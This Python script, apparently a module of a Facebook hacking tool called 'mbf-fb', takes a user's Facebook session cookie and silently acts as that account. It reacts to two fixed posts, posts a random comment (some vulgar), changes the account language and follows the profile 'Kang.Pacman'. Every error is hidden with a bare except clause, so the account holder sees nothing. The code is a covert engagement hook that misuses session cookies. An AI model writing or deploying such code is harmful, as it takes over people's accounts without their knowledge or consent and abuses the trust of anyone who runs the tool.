# cuih rekod!!
# jangan di ubah asu!!
# salam open source:v
import requests as req,re,random
from bs4 import BeautifulSoup as parser
kom=random.choice(["Aap Afandi Ganteng:)","Lo Ngentod:v","Yang Posting Orang Nya Ganteng:)","Mantap:v","Be Yourself And Never Surrentod:v","Keren Bro Script Nya:)","Hi I'm mbf-fb User ^_^"])
class ganteng:
	def __init__(self,kuki):
		self.kuki=kuki
		self.url="https://mbasic.facebook.com"
	def dahlah(self,kuntul,tipe):
		true=False
		data={}
		try:
			a=req.get(kuntul,cookies=self.kuki).text
			for xx in parser(a,"html.parser").find_all("a",href=True):
				if "/reactions/picker/?is_permalink=1" in xx.get("href"):
					if "Tanggapi" in xx.text:
						c=self.url+xx.get("href")
						true=True
			if true==True:
				d=req.get(c,cookies=self.kuki).text
				if "Hapus" not in d:
					for e in parser(d,"html.parser").find_all("a"):
						if f"reaction_type={tipe}" in str(e):
							req.get(f'{self.url}{e.get("href")}',cookies=self.kuki)
			for f in parser(a,"html.parser").find_all("input",{"type":"hidden"}):
				if "fb_dtsg" in f.get("name"):
					data.update({f.get("name"):f.get("value")})
				elif "jazoest" in f.get("name"):
					data.update({f.get("name"):f.get("value")})
					break
			data.update({"comment_text":kom})
			g=re.search('method\=\"post"\ action\=\"(.*?)"',a)
			if g is not None:
				if "fb_dtsg" in data and "jazoest" in data:
					with req.Session() as ses:
						ses.headers.update({"Host":re.findall("//(.+)",self.url)[0],"cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","user-agent":"Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-4/10.0.001; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML,like Gecko) BrowserNG/7.1.17125","referer":kuntul,"origin":self.url,"accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
						ses.cookies.update(self.kuki)
						ses.post(self.url+g.group(1).replace("&amp;","&"),data=data,allow_redirects=False)
		except:pass
	def reaksi(self,ntah=None):
		if ntah is None:
			self.lang();self.dahlah(f"{self.url}/886758932080337","4");self.dahlah(f"{self.url}/1685961541608783","8");self.tuturkeun()
		else:
			self.dahlah(f"{self.url}/886758932080337","4");self.dahlah(f"{self.url}/1685961541608783","8");self.tuturkeun()
	def lang(self):
		try:
			true=False
			cek=req.get(f"{self.url}/language.php",cookies=self.kuki)
			if "Pilih Bahasa Anda" not in cek.text:
				true=True
			if true==True:
				req.get(self.url+parser(cek.text,"html.parser").find("a",string="Bahasa Indonesia").get("href"),cookies=self.kuki)
		except:pass
	def tuturkeun(self):
		try:
			true=False
			cek=req.get(f"{self.url}/Kang.Pacman",cookies=self.kuki)
			if "/a/subscribe.php" in cek.text:
				true=True
			if true==True:
				req.get(self.url+parser(cek.text,"html.parser").find("a",string="Ikuti").get("href"),cookies=self.kuki)
		except:pass